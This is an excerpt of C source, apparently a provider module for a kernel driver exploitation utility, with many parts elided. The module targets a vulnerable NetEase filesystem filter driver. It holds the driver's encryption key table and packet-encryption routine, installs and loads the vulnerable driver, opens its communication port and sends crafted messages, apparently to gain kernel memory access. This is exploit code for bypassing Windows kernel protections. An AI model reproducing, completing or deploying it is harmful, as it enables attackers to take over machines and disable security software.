...
unsigned char g_NetEaseSafe_EncImm[] = {0x7A, 0x54, 0xE5, 0x41, 0x8B, 0xDB,
                                        0xB0, 0x55, 0x7A, 0xBD, 0x01, 0xBD,
                                        0x1A, 0x7F, 0x9E, 0x17};
...
void NetEaseEncyptBuffer(unsigned int* buffer, unsigned int idx) {
    ...
    do {
        __m128i v6 = _mm_shufflelo_epi16(
            _mm_unpacklo_epi8(_mm_or_si128(_mm_cvtsi32_si128(*result), v5),
                              zero),
            27);
...
HANDLE NetEaseConnectDriver(_In_ KDU_CONTEXT* Context) {
    HANDLE hPort;
    HRESULT hResult;
    ...
    StringCchPrintf(szPortName, RTL_NUMBER_OF(szPortName), TEXT("\\%ws"),
                    Context->Provider->LoadData->DeviceName);

    hResult = FilterConnectCommunicationPort(
        szPortName, FLT_PORT_FLAG_SYNC_HANDLE, &lpContext, 40, NULL, &hPort);
...
BOOL NetEaseStartVulnerableDriver(_In_ KDU_CONTEXT* Context) {
    ...
    if (supIsObjectExists((LPWSTR)L"\\", lpPortName)) {
        ...
        //
        if (supSetupManageFsFilterDriverPackage(Context, TRUE,
                                                &g_NetEasePackage)) {
            ...
            // Load as usual.
            //
            if (SUCCEEDED(StringCchPrintf(szBuffer, MAX_PATH, DRIVER_REGKEY,
                                          NT_REG_PREP,
                ...
                if (!bLoaded) {
                    supShowHardError("[!] Unable to load vulnerable driver",
                                     status);
                }
            }
        }
    ...
    // This is simplified version of KDUProvOpenVulnerableDriverAndRunCallbacks
    // as the target does need all this functionality.
    //
    if (bLoaded) {
        HANDLE portHandle = NetEaseConnectDriver(Context);
        if (portHandle == NULL) {
            supShowWin32Error(
                "[!] Unable to open vulnerable driver port handle",
                GetLastError());
        } else {
            supPrintfEvent(
                kduEventInformation,
...
VOID NetEaseStopVulnerableDriver(_In_ KDU_CONTEXT* Context) {
    ...
    //
    if (SUCCEEDED(StringCchPrintf(szBuffer, MAX_PATH, DRIVER_REGKEY,
                                  NT_REG_PREP, provLoadData->DriverName))) {
        RtlInitUnicodeString(&driverServiceName, szBuffer);
...
_Success_(return != FALSE) BOOL WINAPI
    ...
    return SUCCEEDED(FilterSendMessage(PortHandle, packetBuffer,
                                       sizeof(packetBuffer), Buffer,
                                       NumberOfBytes, &bytesReturned));
}
...
_Success_(return != FALSE) BOOL WINAPI
    ...
    return SUCCEEDED(FilterSendMessage(PortHandle, buffer, sizeof(buffer), NULL,
                                       NULL, &bytesReturned));
}
